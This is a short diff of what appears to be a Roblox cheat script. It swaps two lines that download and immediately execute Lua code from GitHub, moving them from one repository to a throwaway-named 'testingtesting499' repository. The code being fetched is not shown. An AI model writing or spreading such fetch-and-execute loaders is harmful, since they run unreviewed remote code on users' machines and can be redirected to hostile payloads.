@@ -18,7 +18,7 @@ local startTime = os.clock()
 repeat wait() until game:IsLoaded()
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/WNCRY-WIN/WNCRY-PSLAM/refs/heads/main/TOOLS/adonis.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/testingtesting499/randomtest12234/refs/heads/main/adonis.lua"))()
 
 
 if not LPH_OBFUSCATED then
@@ -36,7 +36,7 @@ local  Library
 
 
 if assetsupport then
-    Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/WNCRY-WIN/WNCRY-PSLAM/refs/heads/main/TOOLS/Powerful.lua", true))()
+    Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/testingtesting499/randomtest12234/refs/heads/main/Powerful.lua", true))()
 else
     Library  = loadstring(game:HttpGet("https://raw.githubusercontent.com/WNCRY-WIN/WNCRY-PSLAM/refs/heads/main/TOOLS/pslam.lua",true))()
 end
